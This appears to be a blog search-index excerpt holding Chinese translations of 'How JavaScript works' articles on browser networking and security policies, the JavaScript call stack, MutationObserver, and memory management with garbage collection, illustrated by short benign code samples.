1.3 亿个网站。 本章将分析现代浏览器使用哪些技术来自动提升应用性能(在你不知情的情况下)，然后着重介绍浏览器网络层。最后，提供一些让浏览器提升网络应用程序性能的技巧。 概述现代浏览器专门为快速，高效和安全数据传输的网络应用/网站而设计开发的。拥有数以百计的组件运行于各个不同层，从进程管理和安全沙盒到 GPU 管线，音视频等，网络浏览器更类似于一个操作系统而不仅仅只是一个软件。 浏览器的整体性能取决于一些大型组件，包括：解析，布局，样式计算，JavaScript 和 WebAssembly 执行，渲染，当然还有网络栈。 一般情况下，工程师们会把网络栈视为性能瓶颈。经常会发生这样的情况因为从网络抓取所有的资源会堵塞渲染剩下的步骤。为了更加高效的网络层，它需要不仅仅只是扮演套接字管理器的角色。在我们看来获取资源是一个非常简单的机制，但是实际上它集成自身的优化准则，接口和服务的一整套平台。 网页开发者不需要担心单独的 TCP 或者 UDP 数据包，请求格式化，缓存以及其它正在发生的一切。浏览器会处理这些复杂的玩意，这样可以专注开发自己的程序。但是，知道其内部的原理可以帮助开发者开发出更加高效和安全的程序。 本质上，当用户开始和浏览器交互的步骤如下(从浏览器输入URL会发生什么..)： 用户在浏览器地址栏中输入 URL 地址。 在网络上查找指定 URL 的资源，浏览器开始检查本地和应用程序缓存并试着使用本地副本来响应资源的请求。 当缓存不可用，浏览器使用 URL 中的域名然后根据域名从 DNS 处获取服务器的 IP 地址。如果有域名缓存，将不需要进行 DNS 查询。 浏览器创建一个 HTTP 报文表明其请求远程服务器的某个网页。 报文被传输到 TCP 层，该层会在 HTTP 报文头部添加其自身的信息。该信息是保持创建的会话的必要信息。 然后在 IP 层处理报文，该层的主要职责即找出从用户发送报文到远程服务器的路径。在 HTTP 报文头部添加该路径信息。 传输报文到远程服务器。 一旦接收到报文，以类似的方式返回响应数据。 W3C Navigation Timing specification 提供了浏览器接口及浏览器中每个请求背后的可视化计时和性能数据。让我们浏览下这些组件，因为每个组件在获取最佳用户体验方面扮演了重要的角色。 整个网络请求过程是相当复杂的并且有许多的层，每层都有可能成为性能瓶颈。这就是为什么浏览器使用各种技术努力提升其性能，以便把整个网络通信的性能损耗降至最低。 套接字管理(Socket) 源－由应用程序协议，域名和端口号的三个部分组成(比如 https, www.example.com, 443) 套接字池－属于同源的一组套接字(所有的主流浏览器都限制套接字池最多只能有 6 个套接字) JavaScript 和 WebAssembly 禁止开发者操作单独的网络套接字的生命周期，这是相当的明智。这样你无需自己处理这些繁琐的细节而且可以让浏览器自动优化大量性能，这些性能包括套接字复用，请求优化和延迟绑定，协议协商，强制连接限制及其它的优化措施。 实际上，现代浏览器更一步地将请求管理周期从套接字管理中剥离了出来。用套接字池来组织套接字，以源来分组，每个套接字池强制限制其连接数和安全约束。排队，优先化等待的请求，然后和套接字池中的单个套接字绑定。如果不是服务器主动关闭这些连接，多个请求可以自动重用相同的套接字。 由于创建一个新的 TCP 连接会带来额外的性能开销，重用连接会为其自带来极大的性能提升。默认情况下，当发起请求的时候，浏览器使用所谓的 『keepalive』机制以节省创建到服务器的新连接所耗费的时间。创建一个新的 TCP 连接的平均时间为： 本地请求－23 毫秒 Transcontinental 请求－120 毫秒 Intercontinental 请求－225 毫秒 这样的架构衍生出了一些优化机会。请求可以依据优先级来以不同的顺序执行。浏览器可以优化所有套接字间的带宽分配或者它可以创建套接字以等待预期的请求。 如上所述，这些都是浏览器进行控制而无需开发者干预。但这并不意味着我们什么都做了。选择正确的数据传输所用的网络通信模式，类型和频率，正确的协议类型以及正确的服务器堆栈隧道/优化对于提升整个程序的性能有着至关重要的作用。 部分浏览器甚至更进一步。例如，当你使用 Chrome 的时候，当用户使用的时候它会进行自我学习从而变得更加快速。它基于访问过的网页和典型的浏览器模式来进行学习，这样可以预测可能的用户行为且在用户进行任意操作之前进行操作。最简单的例子即当用户悬停在某个链接上的时候预渲染页面。如果你想学习更多关于 Chrome 优化技术的文章，可以查看 High-Performance Browser Networking 这本书的 https://www.igvita.com/posa/high-performance-networking-in-google-chrome/ 章节。 网络安全和沙盒允许浏览器管理单独的套接字有另一个非常重要的目的即：浏览器就可以针对不被信任的程序资源强制实施一套一致的安全和政策约束措施。例如，浏览器禁止通过 API 直接访问原始网络套接字，因为这样会导致任意可疑的程序随意连接任意主机。浏览器也强制连接数限制以保护服务器免受由于客户端访问而耗尽其资源。 浏览器格式化所有流出的请求以强制格式正确和一致的协议语义来保护服务器。同样地，浏览器会自动解码响应内容以保护用户免受可疑服务器的攻击。 TSL 协商Transport Layer Security (TLS) 是一个为计算机网络提供通信安全的加密协议。它广泛应用于大量应用程序，其中之一即浏览网页。网站可以使用 TLS 来保证服务器和网页浏览器之间的所有通信安全。 整个 TLS 握手过程包含以下步骤： 客户端向服务器发送 『Client hello』 信息，附带着客户端随机值和支持的密码组合。 服务器返回给客户端 『Server hello』信息，附带着服务器随机值。 服务器返回给客户端认证证书及或许要求客户端返回一个类似的证书。服务器返回『Server hello done』信息。 如果服务器要求客户端发送一个证书，客户端进行发送。 客户端创建一个随机的 Pre-Master 密钥然后使用服务器证书中的公钥来进行加密，向服务器发送加密过的 Pre-Master 密钥。 服务器收到 Pre-Master 密钥。服务器和客户端各自生成基于 Pre-Master 密钥的主密钥和会话密钥。 客户端给服务器发送一个 『Change cipher spec』的通知，表明客户端将会开始使用新的会话密钥来哈希和加密消息。客户端也发送了一个 『Client finished』的消息。 服务器接收到『Change cipher spec』的通知然后使用会话钥匙来切换其记录层安全状态为对称加密状态。服务器返回客户端一个 『Server finished』消息。 客户端和服务器现在可以通过建立的安全通道来交换程序数据。所有客户端和服务器之间发送的信息都会使用会话密钥进行加密。 当发任意验证失败生时，用户会收到警告。比如服务器使用自签名的证书。 同源策略当两个页面的协议，端口(如果有指定)以及主机名都是一样的则称为同源。 以下为一些可能包含跨域的资源示例： &lt;script src=”…”&gt;&lt;/script&gt; 里面的 JavaScript 代码。语法错误的错误信息仅适用于同源脚本。 &lt;link rel=”stylesheet” href=”…”&gt; 的 CSS。由于 CSS 的松散语法规则，跨域 CSS 要求正确的 Content-Type 头。各个浏览器的限制不同。 &lt;img&gt; 图片 &lt;video&gt; 和 &lt;audio&gt; 媒体文件 &lt;object&gt;, &lt;embed&gt; 和 &lt;applet&gt; 插件 @font-face 字体。一些浏览器允许跨域字体，其它则要求同源字体。 &lt;frame&gt; 和 &lt;iframe&gt; 相关的一切内容。网站可以使用 X-Frame-Options 头来防止此种跨域交互。 以上的列表还远远不够；该列表旨在强调工作中的『最小特权』原则。浏览器只为应用程序代码暴露出其所必需的接口和资源：应用提供数据和 URL 地址，然后浏览器格式化请求及处理每条连接的整个生命周期。 需要注意的是并没有一个简单的 『同源策略』概念。 相反，有一系列相关的机制来强制限制浏览器的 DOM 访问，cookie 和 会话状态管理，网络连接和其它组件。可以参考文章浏览器同源策略 资源和客户端状态缓存最好和最快的请求即不创建请求。在分派一个请求前，浏览器自动检查其资源缓存，进行必要的验证检查然后当指匹配指定的条件时返回一份本地资源拷贝。如果缓存中没有可用的本地资源，则发起网络请求然后把响应内容自动放置于缓存中以备之后的访问(如果这是被允许的)。 浏览器自动为每个资源求值缓存指令。 当条件允许时，浏览器自动重新恢复过期资源 浏览器自动处理缓存大小和资源回收 管理一个高效和优化的资源缓存是非常困难的。感谢浏览器为我们处理这些复杂的细节，而我们所需要做的即保证服务器返回恰当的缓存指令；想了解更多可以看 客户端资源缓存 文章。你为网页上的所有资源添加 Cache-Control，ETag，和 Last-Modified 的响应头信息。 最后，一个经常被忽略但至关重要的浏览器功能即其提供了验证，会话和 cookie 管理。浏览器为每个源维护单独的『cookie jars』，通过提供必要的程序和服务器接口来读写新的 cookie，会话和认证数据，以及自动挂载和处理适当的 HTTP 头来为我们自动处理整个过程。 例子：一个简单明了的用来展示浏览器的延迟会话状态管理的方便性的例子即：多个选项卡或者浏览器窗口可以共享一个认证会话，反之亦然；一个选项卡中的登出操作可以使所有其它打开窗口的会话失效。 应用程序接口和协议了解网络服务之后，最终要讲到应用程序接口和协议。众所周知，更底层的结构提供了一组广泛的重要服务：套接字和连接管理，请求和响应处理，各种安全策略，缓存及其它更多的强制措施。每当初始化一个 HTTP 请求或者 XMLHttpRequest，一个持久的服务推事件或者 WebSocket 会话或打开一个 WebRTC 连接，我们就是在和部分或者所有这些底层服务进行交互。 没有单一的最佳协议或者接口。每个复杂的程序都会基于不同的要求混合使用不同的传输协议：和浏览器缓存的交互，协议开销，消息延迟，可靠性，数据传输类型以及其它。一些协议拥有低数据传输延迟的特性(比如服务器推事件，WebSocket)，但是可能不符合其它重要的场合，比如利用浏览器缓存或者支持任意情况下的二进制数据传输的能力。 一些提升程序性能和安全的小技巧 一直在请求中使用 『Connection: Keep-Alive』头信息。浏览器默认在请求头中添加 『Connection: Keep-Alive』。保证服务器也使用同样的机制。 使用合适的 Cache-Control，Etag 和 Last-Modified 头信息以便节省浏览器的下载时间。 花些时间调整和优化服务器。这是奥秘所在！注意这一过程是否针对每个程序和所传输的数据。 建议使用 TLS !特别是如果程序中包含有任意类型的认证。 研究浏览器所提供的安全策略并且在程序中强制实施。","link":"/posts/987512c9.html"},{"title":"JS引擎，运行时及调用栈概述","text":"How JavaScript works: an overview of the engine, the runtime, and the call stack 原文请查阅这里 这是 JavaScript 工作原理的第一章。本章会对语言引擎，运行时，调用栈做一个概述。 随着 JavaScript 的流行，团队也利用它在前端，后端，混合 apps，嵌入式设备及其他等开发栈中进行不同层面的支持。 How Javascript works系列旨在深入 JavaScript 并理解它背后的运行方式：我们认为在了解 JavaScript 的构建模块和它们是如何在一起工作之后你将会写出更好的代码和应用。我们将会分享一些当在创建 SessionStack 时候的经验法则，SessionStack 是一个轻量级的 JavaScript 程序它拥有强壮性和高性能的优点以保持竞争力。本文为此系列第一篇文章。 正如 GitHut stats 所示，JavaScript 的活跃库和总推送数在 Github 排名第一。其它方面的表现也不会比其它语言落下太多。 (点击查看最新 Github 语言统计) 如果项目对 JavaScript 依赖程度很高，这意味着开发者不得不使用 JavaScript 和其生态提供的一切，为了创造出很酷的软件，就得更加深入地了解 JavaScript 语言的内部工作机制。 但事实不少日常使用 JavaScript 的开发者几乎不了解其底层知识。 概述几乎所有前端开发都听说过 V8 引擎的概念，并且知道 JavaScript 是单线程的或基于一个回调队列。 在本文中，我将会详细介绍这些概念并解释 JavaScript 的工作原理。希望了解这些细节后，你可以通过合理使用提供的 APIs, 写出更好的，非阻塞应用。 如果你是菜鸟，本文将会帮助你理解为什么 JavaScript 和其它语言相比是那么“奇特”。 如果你是一个经验丰富的 JavaScript 开发者，但愿能帮你更加深入了解 JavaScript 运行时的工作原理。 JavaScript 引擎谷歌 V8 引擎是流行的 JavaScript 引擎之一。V8 引擎在诸如 Chrome 和 Node.js 内部使用。简单示例如下: 引擎由两个主要部分组成： 堆内存 － 动态内存管理 调用栈－代码执行时栈帧所存放的位置 运行时几乎每个 JavaScript 开发者都使用过一些浏览器 APIs(比如 setTimeout)。然而这些 API并不是引擎所提供的。 那么它们从何而来？ 所以，除了引擎本身还有更多其它方面的东西。有 Web API，由浏览器提供的，比如 DOM,AJAX,setTimeout 以及其它。 于是乎，就有了流行的事件循环和回调队列。 调用栈JavaScript 只是一个单线程的编程语言，这意味着它只有一个调用栈。这样它只能一次做一件事情。(JavaScript的单线程与它的用途有关。作为浏览器脚本语言，JavaScript的主要用途是与用户互动，以及操作DOM。这决定了它只能是单线程，否则会带来复杂的同步问题) 调用栈是一种数据结构用来记录我们在程序中的位置。当执行进入一个函数，把它置于栈的顶部。如果从函数中返回则从栈顶部移除函数。这就是调用栈所能够做的事情。 比如： 12345678910function multiply(x, y) { return x * y;}function printSquare(x) { var s = multiply(x, x); console.log(s);}printSquare(5); 当引擎开始执行这段代码的时候，调用栈会被清空。之后，产生如下步骤： 调用栈中的每个入口被称为栈帧。 当抛出异常时这是堆栈跟踪是如何被构造出来的－这基本上是当发生异常的时候调用栈的状态。请看下面代码： 12345678910111213function foo() { throw new Error('SessionStack will help you resolve crashes:)');}function bar() { foo();}function start() { bar();}start(); 假如 Chrome 浏览器中执行（假设代码在 foo.js 的文件中），将会产生如下堆栈跟踪： “栈溢出”－当你达到最大调用栈大小时会发生。这种情况相当容易发生，特别是当没有正确使用时。如下： 12345function foo() { foo();}foo(); 当引擎开始执行这段代码，它开始调用 foo 函数。然而这个函数会递归并开始调用其自身而没有任何结束条件。所以在每步执行过程中，调用堆栈会反复地添加同样的函数。执行过程如下所示： 在某一时刻，调用堆栈中的函数调用次数超过了调用堆栈的实际大小，这样浏览器决定执行抛出错误的动作，如下所示： 在单线程中运行代码相较于多线程会比较轻松，因为你不用处理多线程环境中产生的一些复杂场景，比如死锁。 但在单线程运行代码也会有一些限制。由于 JavaScript 只有一个调用栈，如果运行速度很慢时会发生什么？ 并发和事件循环当你在调用栈中有需要运行大量的时间的函数会发生什么？比如你想要在浏览器用 JavaScript 来执行一些复杂的图像转化。 你或许会觉得这也算个问题？问题是——当调用栈有函数需要执行，浏览器实际上不能做其它任何事－因为它被阻塞了。这意味着浏览器不能够执行渲染，不能够运行其它代码，它被阻塞了。如果你想要在 app 中拥有酷炫的流畅 UI 体验，这将会是个问题。 这不会是唯一的问题。一旦浏览器开始在调用栈中执行如此多的任务，浏览器将会在相当一段时间内停止交互。大多数浏览器会抛出一个错误，询问你是否关闭网页。 这并不是最好的用户体验。 因此，如何不阻塞 UI 且不让浏览器停止响应来执行运行缓慢的代码呢？使用异步回调。 这将会在 『JavaScript 工作原理』 第二章：『V8 引擎探索及编写最优代码的5个技巧』中进行详细阐述。","link":"/posts/503970b4.html"},{"title":"使用MutationObserver监测DOM","text":"How JavaScript works: tracking changes in the DOM using MutationObserver 原文请查阅这里，略有删减。 网络应用在客户端日益复杂，这是由很多因素的造成的，比如需要更加丰富的界面交互以提供更加复杂的应用功能，实时计算等。 日益增长的复杂度导致无法知晓其生命周期中指定时刻准确的交互界面状态。 如果你正在构建框架或者库，这会更加困难，比如，必须执行依赖于 DOM 响应的一些特定的操作。 概述MutationObserver 是现代浏览器提供的用来检测 DOM 变化的 Wed API。你可以使用这个接口来监听新增或者删除节点，属性更改，或者文本节点的内容变化。 你可以在以下几种情况下使用 MutationObserver 接口。比如： 通知用户当前所在的页面所发生的一些变化。 创建一个 JavaScript 框架可以用来根据 DOM 的变化来动态加载 JavaScript 模块。 可能当你在开发一个所见即所得编辑器的时候，使用 MutationObserver 接口来收集任意时间点上的更改，从而轻松地实现撤消/重做功能。 以上只是几个 MutationObserver 的使用场景。 如何使用 MutationObserver在应用中集成 MutationObserver 并不困难。向构造函数 MutationObserver 中传入一个函数作为参数来初始化一个 MutationObserver 实例，该函数会在每次发生 DOM 变化时调用。MutationObserver 的函数的第一个参数即为单个批处理中的 DOM 变化集。每个变化包含了变化的类型和所发生的更改。 12345var mutationObserver = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { console.log(mutation); });}); 创建的实例对象拥有三个方法： observe－开始进行监听。接收两个参数－要观察的 DOM 节点以及一个配置对象。 disconnect－停止监听变化。 takeRecords－触发回调前返回最新的批量 DOM 变化。 以下为开始监听的代码片段： 123456789// 开始监听页面根元素 HTML 变化。mutationObserver.observe(document.documentElement, { attributes: true, characterData: true, childList: true, subtree: true, attributeOldValue: true, characterDataOldValue: true}); 现在，假设你写了一个简单 div 元素： 1&lt;div id=\"sample-div\" class=\"test\"&gt; Simple div &lt;/div&gt; 使用 jQuery 来移除 div 的 class 属性： 1$(\"#sample-div\").removeAttr(\"class\"); 当调用 mutationObserver.observe(…) 就可以开始监听 DOM 变化。 当每次发生 DOM 变化的时候，会打印出各个 MutationRecord 日志信息： 这一改变是由移除 class 属性所引起的。 最后，如果想停止监听 DOM 变化可以使用如下方法： 12// MutationObserver 停止监听 DOM 变化mutationObserver.disconnect(); 现在，MutationObserver 浏览器兼容情况很好： 替代方法之前 MutationObserver 并没有被广泛使用。那么，当没有 MutationObserver 的时候，开发者是如何解决监听 DOM 变化的呢？ 有几下几种可用的方法： 轮询 MutationEvents CSS 动画 轮询最简单粗暴的方法即使用轮询。使用浏览器内置的 setInterval 网页接口你可以创建一个定时任务来定时检查 DOM 的变化。当然了，这个方法会显著地减弱网络应用/网站的性能。 MutationEvents早在 2000 年，就推出了 MutationEvents API 。虽然有效的，但是每个的 DOM 变化都会触发 mutation 事件，结果又会造成性能问题。现在，MutationEvents 接口已经被废弃，不久的将来，现代浏览器全都将停止支持该接口。 CSS 动画依靠 CSS 动画 是一个令人感到新奇的替代方案。这听起来会让人有些困惑。大体上，实现思路是这样的，创建一个动画，一旦在 DOM 中添加一个元素就会触发该动画。开始执行 CSS 动画的时候就会触发 animationstart 事件：假设为该事件添加事件监听器，就可以准确知晓 DOM 中添加元素的时机。动画的运行时间周期必须非常的短以便让用户感知不到，即体验更佳。 首先，需要一个父级元素，在里面监听节点添加事件： 1&lt;div id=”container-element”&gt;&lt;/div&gt; 为了处理节点添加，需要创建关键帧序列动画，该序动画在添加节点的时候启动： 1234@keyframes nodeInserted { from { opacity: 0.99; } to { opacity: 1; } } 关键帧创建之后，在需要监听的元素上应用动画。注意到那个短暂的持续时间-在浏览器端动画痕迹会非常平滑（即用户会感觉不到有动画发生）： 1234#container-element * { animation-duration: 0.001s; animation-name: nodeInserted;} 这样会为 container-element 的所有后代节点添加动画。当动画结束，触发 insertion 事件。 我们需要创建一个函数作为事件监听器。在函数内部，开始必须使用 event.animationName 代码进行检查，确保是我们所监听的动画。 123456var insertionListener = function(event) { // 确保是所监听的动画 if (event.animationName === \"nodeInserted\") { console.log(\"Node has been inserted: \" + event.target); }} 为父元素绑定事件监听器(事件委托)： 123document.addEventListener(“animationstart”, insertionListener, false); // standard + firefoxdocument.addEventListener(“MSAnimationStart”, insertionListener, false); // IEdocument.addEventListener(“webkitAnimationStart”, insertionListener, false); // Chrome + Safari CSS 动画浏览器支持情况也不错。 相比以上几种替代方案 MutationObserver 有几点优势。本质上，它会监听 DOM 可能发生的每个变化并且性能更优，因其会批量 DOM 变化之后才触发回调事件。总之，MutationObserver 的兼容性很好，并且还有一些 polyfill，这些 polyfill 底层是基于 MutationEvents 的。","link":"/posts/e65b7520.html"},{"title":"内存管理及4种常见的内存泄漏处理","text":"How JavaScript works: memory management + how to handle 4 common memory leaks 原文请查阅这里 本章中, 我们将讨论日常使用中另一个被开发者越来越忽略的重要话题，这都是日益成熟和复杂的编程语言的锅，即内存管理。我们将会提供 SessionStack 开发时所遵循的处理 JavaScript 内存泄漏的几条小技巧，因为我们需要保证 SessionStack 不会引起内存泄漏或者不会增加我们所集成的 web 应用程序的内存消耗。 概述一些语言, 比如 C 语言拥有底层的内存管理原语如 malloc() 和 free()。开发者使用这些原语在操作系统显式地分配和释放内存。 与此同时，当创建事物(对象，字符串等)的时，JavaScript 自动分配内存且当它们不再被使用时 “自动释放” 内存，这一过程称为内存垃圾回收。这个乍看起来本质上是 “自动化释放内存” 的释放资源是引起混乱的原因，并且给予 JavaScript(及其它高级语言)开发者一个错误的印象即他们可以选择忽略内存管理。这是一个巨大的错误。 即使是当使用高级语言的时候，开发者也应该要理解内存管理(或者至少是一些基础)。有时候自动化内存管理会存在一些问题(比如垃圾回收中的 bugs 或者实施的局限性等等)，为了能够合理地处理内存泄漏问题(或者以最小代价和代码缺陷来寻找一个合适的方案)，开发者就必须理解内存管理。 内存生命周期不管你使用哪种编程语言，内存生命周期几乎是一样的： 以下是生命周期概述： 分配内存－内存由操作系统分配后允许你的程序使用它。在底层语言(例如 C 语言)，开发者可以显式地操作内存。而高级语言，其本身会帮你处理。 使用内存－这是程序实际使用之前分配的内存的阶段。当你在代码中使用已分配的变量时，就会发生内存读写的操作。 释放内存－该阶段你可以释放你不再使用的整块内存，该内存就可以被释放并重新使用。和内存分配操作一样，该操作也是用底层语言显式编写的。 为快速浏览调用堆栈和动态内存管理的概念，你可以阅读第一篇文章。 内存是什么？在直接跳向 JavaScript 内存之前，先来简要地介绍一下内存及其工作原理。 从硬件层面看，计算机内存是由大量的 flip flops 所组成的(这里大概查了下，即大量的二进制电路所组成的)。每个触发器(flip flop)包含少量晶体管并能够存储一个比特位。单个的触发器可以通过一个唯一标识符寻址，所以就可以读和覆写它们。因此，理论上，我们可以把整个计算机内存看成是由一个巨大的比特位数组所组成的，这样就可以进行读和写。 作为人类，我们并不擅长用位来进行所有的逻辑思考和计算，所以我们把位组织成一个更大的组，这样就可以用来表示数字。8 位称为一字节。除了字节还有字(16 或 32 位)。 内存中存储着很多东西： 所有变量及所有程序使用的其它数据。 程序代码，包括操作系统的代码。 编译器和操作系统一起协作为你进行内存管理，但我们建议你了解一下底层是如何实现的。 编译代码时，编译器会检查原始数据类型并提前计算出程序运行所需要的内存大小。在静态堆栈空间中，所需的内存大小会被分配给程序。这些变量所分配到的内存所在的空间之所以被称为静态内存空间是因为当调用函数的时候，函数所需的内存会被添加到现存内存的顶部。当函数中断，它们被以 LIFO(后进先出) 的顺序移出内存。比如，考虑如下代码： 123int n; // 4 字节int x[4]; // 4 个元素的数组，每个数组元素 4 个字节double m; // 8 字节 编译器会立即计算出代码所需的内存：4 + 4 x 4 + 8 = 28 字节。 编译器是这样处理当前整数和浮点数的大小的。大约 20 年前，整数一般是 2 字节而 浮点数是 4 字节。代码不用依赖于当前基础数据类型的字节大小。 编译器会插入标记，标记会和操作系统协商从堆栈中获取所需要的内存大小，以便在堆栈中存储变量。 在以上示例中，编译知道每个变量的准确内存地址。事实上，当你编写变量 n 的时候，会在内部把它转换为类似 “内存地址 412763” 的样子。 注意到这里当我们试图访问 x[4] 时候，将会访问到 m 相关的数据。这是因为我们访问了数组中不存在的数组元素－它超过了最后一个实际分配到内存的数组元素 x[3] 4 字节，并且有可能会读取(或者覆写) m 的位。这几乎可以确定会产生程序所预料不到的后果。 当函数调用其它函数的时候，各个函数都会在被调用的时候取得其在堆栈中的各自分片内存地址。函数会把保存它所有的本地变量，但也会有一个程序计数器用来记住函数在其执行环境中的地址。当函数运行结束时，其内存块可以再次被用作其它用途。 动态内存分配不幸的是，想要知道编译时一个变量需要多少内存并没有想象中那般容易。设想一下若要做类似如下事情： 123int n = readInput(); // 从用户读取信息...// 创建一个含有 n 个元素的数组 这种情况下，编译器并不知道编译时数组需要多少内存，因为这是由用户输入的数组元素的值所决定的。 因此，就不能够在栈中为变量分配内存空间。相反，程序需要在运行时显式地从操作系统分配到正确的内存空间。这里的内存是由堆空间所分配。静态和动态内存分配的差异总结如下图表： 为了完全理解动态内存分配的工作原理，我们需要花点时间了解指针，这个就可能有点跑题了 ^.^。如果你对指针感兴趣，请留言，然后我们将会在以后的章节中讨论更多关于指针的内容。 JavaScript 中的内存分配现在，我们将会介绍在 JavaScript 中是如何分配内存的((第一步)。 JavaScript 通过声明变量值，自己处理内存分配工作而不需要开发者干涉。 123456789101112131415161718var n = 374; // 为数字分配内存var s = 'sessionstack'; // 为字符串分配内存var o = { a: 1, b: null}; // 为对象及其值分配内存var a = [1, null, 'str']; // (类似对象)为数组及其数组元素值分配内存function f(a) { return a + 3;} // 分配一个函数(一个可调用对象)// 函数表达式也分配一个对象someElement.addEventListener('click', function() { someElement.style.backgroundColor = 'blue';}, false); 一些函数调用也会分配一个对象： 123var d = new Date(); // 分配一个日期对象var e = document.createElement('div'); // 分配一个 DOM 元素 可以分配值或对象的方法： 1234567var s1 = 'sessionstack';var s2 = s1.substr(0, 3); // s2 为一个新字符串// 因为字符串是不可变的，所以 JavaScript 可能会选择不分配内存而只是存储数组 [0, 3] 的内存地址范围。var a1 = ['str1', 'str2'];var a2 = ['str3', 'str4'];var a3 = a1.concat(a2);// 包含 4 个元素的新数组由 a1 和 a2 数组元素所组成 JavaScript 中的内存使用JavaScript 中使用分配的内存主要指的是内存读写。 可以通过为变量或者对象属性赋值，亦或是为函数传参来使用内存。 释放空闲内存大多数的内存管理问题是出现在这一阶段。 痛点在于检测出何时分配的内存是闲置的。它经常会要求开发者来决定程序中的这段内存是否已经不再使用，然后释放它。 高级程序语言集成垃圾回收器的软件，它的工作就是追踪内存分配和使用情况以便找出并自动释放闲置的分配内存片段。 不幸的是，这是个近似的过程，因为判定一些内存片段是否闲置的普遍问题在于其不可判定性(不能为算法所解决)。 大多数的垃圾回收器会收集那些不再被访问的内存，比如引用该内存的所有变量超出了内存寻址范围。然而还是会有低于近似值的内存空间被收集，因为在任何情况下仍然可能会有变量在内存寻址范围内引用该内存地址，即使该内存是闲置的。 垃圾回收由于找出 “不再使用” 的内存的不可判定性，针对这一普遍问题，垃圾回收实现了一个有限的解决方案。本小节将会阐述必要的观点来理解主要的内存垃圾回收算法及其局限性。 内存引用引用是内存垃圾回收算法所依赖的主要概念之一。 在内存管理上下文中，如果对象 A 访问了另一个对象 B 表示 A 引用了对象 B(可以隐式或显式)。举个例子，一个 JavaScript 对象有引用了它的原型(隐式引用)和它的属性值(显式引用)。 在此上下文中，”对象” 的概念被拓展超过了一般的 JavaScript 对象并且包含函数作用域(或者全局词法作用域)。 词法作用域定义了如何在嵌套函数中解析变量名。即使父函数已经返回，内部的函数仍然会包含父函数的作用域。 垃圾回收引用计数这是最简单的内存垃圾回收算法。当一个对象被 0 引用，会被标记为 “可回收内存垃圾”。 看下如下代码： 123456789101112131415161718192021222324var o1 = { o2: { x: 1 }};// 创建两个对象。// 'o1' 引用对象 'o2' 作为其属性。全部都是不可回收的。// 'o3' 是第二个引用 'o1' 对象的变量var o3 = o1;o1 = 1; // 现在，原先在 'o1' 中的对象只有一个单一的引用，以变量 'o3' 来表示// 引用对象的 'o2' 属性。// 该对象有两个引用：一个是作为属性，另一个是 'o4' 变量var o4 = o3.o2;// 'o1' 对象现在只有 0 引用，它可以被作为内存垃圾回收。// 然而，其 'o2' 属性仍然被变量 'o4' 所引用，所以它的内存不能够被释放。o3 = '374';o4 = null;// 'o1' 中的 'o2' 属性现在只有 0 引用了。所以 'o1' 对象可以被回收。 循环引用造成的麻烦循环引用会造成限制。在以下的示例中，创建了两个互相引用的对象，这样就会造成循环引用。函数调用之后他们将会超出范围，所以，实际上它们是无用且可以释放对他们的引用。然而，引用计数算法会认为由于两个对象都至少互相引用一次，所以他们都不可回收的。 12345678function f() { var o1 = {}; var o2 = {}; o1.p = o2; // O1 引用 o2 o2.p = o1; // o2 引用 o1. 这就造成循环引用}f(); 标记-清除算法为了判断是否需要释放对对象的引用，算法会确定该对象是否可到达。 标记-清除算法包含三个步骤： 根：一般来说，根指的是代码中引用的全局变量。就拿 JavaScript 来说，window 对象即是根的全局变量。Node.js 中相对应的变量为 “global”。垃圾回收器会构建出一份所有根变量的完整列表。 随后，算法会检测所有的根变量及他们的后代变量并标记它们为激活状态(表示它们不可回收)。任何根变量所到达不了的变量(或者对象等等)都会被标记为内存垃圾。 最后，垃圾回收器会释放所有非激活状态的内存片段然后返还给操作系统。 标记-清除算法的动态图示 该算法比之前的算法要好，因为对象零引用可以让对象不可获得。反之则不然，正如之前所看到的循环引用。 从 2012 年起，所有的现代浏览器都内置了一个标记－清除垃圾回收器。前些年所有对于 JavaScript 内存垃圾收集(分代/增量/并发/并行 垃圾收集)的优化都是针对标记-清除算法的实现的优化，但既没有提升垃圾收集算法本身，也没有提升判定对象是否可获得的能力。 你可以查看这篇文章 来了解追踪内存垃圾回收的详情及包含优化了的标记-清除算法。 循环引用不再是问题在之前的第一个示例中，当函数返回，全局对象不再引用这两个对象。结果，内存垃圾回收器发现它们是不可获得的。 即使两个对象互相引用，也不能够从根变量获得他们。 内存垃圾回收器的反直观行为虽然内存垃圾回收器很方便，但是它们也有其一系列的代价。其中之一便是不确定性。意思即内存垃圾回收具有不可预见性。你不能确定内存垃圾收集的确切时机。这意味着在某些情况下，程序会使用比实际需要更多的内存。在其它情况下，在特定的交互敏感的程序中，你也许需要注意那些内存垃圾收集短暂停时间。虽然不确定性意味着不能够确定什么时候可以进行内存垃圾收集，但是大多数 GC 的实现都是在内存分配期间进行内存垃圾回收的一般模式。如果没有进行内存分配，大多数的内存垃圾回收就会保持闲置状态。考虑以下情况： 执行大量的内存分配。 大多数的元素(或所有)被标记为不可获得(假设我们赋值我们不再需要的缓存为 null ) 不再分配其它内存。 在该情况下，大多数的内存垃圾回收器不会再运行任何的内存垃圾回收。换句话说，即使可以对该不可获得的引用进行垃圾回收，但是内存收集器不会进行标记。虽然这不是严格意义上的内存泄漏，但是这会导致高于平常的内存使用率。 内存泄漏是什么？内存泄漏即一些程序在过去时使用但处于闲置状态，却没有返回给操作系统或者可用内存池。 编程语言喜欢用多种方法管理内存。然而，某个内存片段是否被使用是一个不确定的问题。换句话说，只有开发人员清楚某个内存片段是否可以返回给操作系统。 某些编程语言会为开发者提供功能函数来解决这个问题。其它的编程语言完全依赖于开发者全权掌控哪个内存片段是可回收的。维其百科上有关于手动和自动内存管理的好文章。 四种常见的 JavaScript 内存泄漏1: 全局变量JavaScript 以一种有趣的方式来处理未声明变量：当引用一个未声明的变量，会在全局对象上创建一个新的变量。在浏览器中，全局对象是 window，这意味着如下代码： 123function foo(arg) { bar = \"some text\";} 等同于： 123function foo(arg) { window.bar = \"some text\";} 变量 bar 本意是只能在 foo 函数中被引用。但是如果你没有用 var 来声明变量，那么将会创建一个多余的全局变量。在上面的例子中，并不会造成大的事故。但你可以很自然地想象一个更具破坏性的场景。 使用 this 关键字也可能在不经意间创建一个全局变量。 12345function foo() { this.var1 = \"potential accidental global\";}// 调用 foo 函数自身，this 会指向全局对象(window)而不是未定义 你可以通过在 JavaScript 文件的顶部添加 'use strict' 来避免以上的所有问题，'use strict' 会切换到更加严格的 JavaScript 解析模式，这样就可以防止创建意外的全局变量。 